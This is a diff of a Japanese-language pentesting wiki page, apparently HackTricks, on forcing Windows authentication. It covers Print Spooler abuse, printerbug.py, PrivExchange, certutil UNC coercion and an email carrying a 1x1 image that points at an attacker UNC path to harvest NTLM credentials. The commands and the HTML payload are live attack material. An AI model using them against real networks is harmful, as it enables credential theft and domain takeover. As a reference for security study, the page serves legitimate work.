@@ -4,16 +4,16 @@
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、**3rd party依存関係を避けるためにMIDLコンパイラを使用してC#でコーディングされた** **リモート認証トリガーのコレクション**です。
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、3rd party依存関係を避けるためにMIDLコンパイラを使用してC#でコーディングされた**リモート認証トリガー**の**コレクション**です。
 
 ## スプーラーサービスの悪用
 
-_**Print Spooler**_ サービスが **有効** の場合、既知のAD資格情報を使用して、ドメインコントローラーの印刷サーバーに新しい印刷ジョブの **更新** を **要求** し、通知を **特定のシステムに送信するように指示** できます。\
-プリンターが任意のシステムに通知を送信する際には、その **システムに対して認証する必要があります**。したがって、攻撃者は _**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証では **コンピュータアカウント** を使用します。
+_**Print Spooler**_ サービスが**有効**な場合、既知のAD資格情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの**更新**を**要求**し、**通知を任意のシステムに送信するように指示**できます。\
+プリンターが任意のシステムに通知を送信する際には、その**システムに対して認証する必要があります**。したがって、攻撃者は_**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証では**コンピュータアカウント**が使用されます。
 
-### ドメイン上のWindowsサーバーの検索
+### ドメイン上のWindowsサーバーの発見
 
-PowerShellを使用して、Windowsボックスのリストを取得します。サーバーは通常優先されるため、そこに焦点を当てましょう：
+PowerShellを使用してWindowsボックスのリストを取得します。サーバーは通常優先されるため、そこに焦点を当てましょう：
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
@@ -45,13 +45,15 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 
 ## RCP強制認証
 
-{% embed url="https://github.com/p0dalirius/Coercer" %}
+{{#ref}}
+https://github.com/p0dalirius/Coercer
+{{#endref}}
 
 ## PrivExchange
 
-`PrivExchange`攻撃は、**Exchange Serverの`PushSubscription`機能**に見つかった欠陥の結果です。この機能により、メールボックスを持つ任意のドメインユーザーがHTTPを介して任意のクライアント提供ホストに対してExchangeサーバーを強制的に認証させることができます。
+`PrivExchange`攻撃は、**Exchange Serverの`PushSubscription`機能**に見つかった欠陥の結果です。この機能により、メールボックスを持つ任意のドメインユーザーが、HTTP経由で任意のクライアント提供ホストに対してExchangeサーバーを強制的に認証させることができます。
 
-デフォルトでは、**ExchangeサービスはSYSTEMとして実行され**、過剰な特権が与えられています（具体的には、**2019年以前の累積更新に対するWriteDacl特権を持っています**）。この欠陥は、**情報をLDAPに中継し、その後ドメインNTDSデータベースを抽出する**ために悪用できます。LDAPへの中継が不可能な場合でも、この欠陥はドメイン内の他のホストに中継および認証するために使用できます。この攻撃の成功した悪用は、認証された任意のドメインユーザーアカウントでドメイン管理者への即時アクセスを許可します。
+デフォルトでは、**ExchangeサービスはSYSTEMとして実行され**、過剰な特権が与えられています（具体的には、**2019年以前の累積更新に対するドメインのWriteDacl特権**を持っています）。この欠陥は、**LDAPへの情報の中継を可能にし、その後ドメインNTDSデータベースを抽出する**ために悪用できます。LDAPへの中継が不可能な場合でも、この欠陥はドメイン内の他のホストに中継および認証するために使用できます。この攻撃の成功した悪用は、認証された任意のドメインユーザーアカウントでドメイン管理者への即時アクセスを許可します。
 
 ## Windows内部
 
@@ -88,7 +90,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### メール経由
 
-もしあなたが侵害したいマシンにログインするユーザーの**メールアドレス**を知っているなら、**1x1画像**を含む**メール**を送信することができます。
+もしあなたが侵害したいマシンにログインしているユーザーの**メールアドレス**を知っているなら、**1x1画像**を含む**メール**を送信することができます。
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
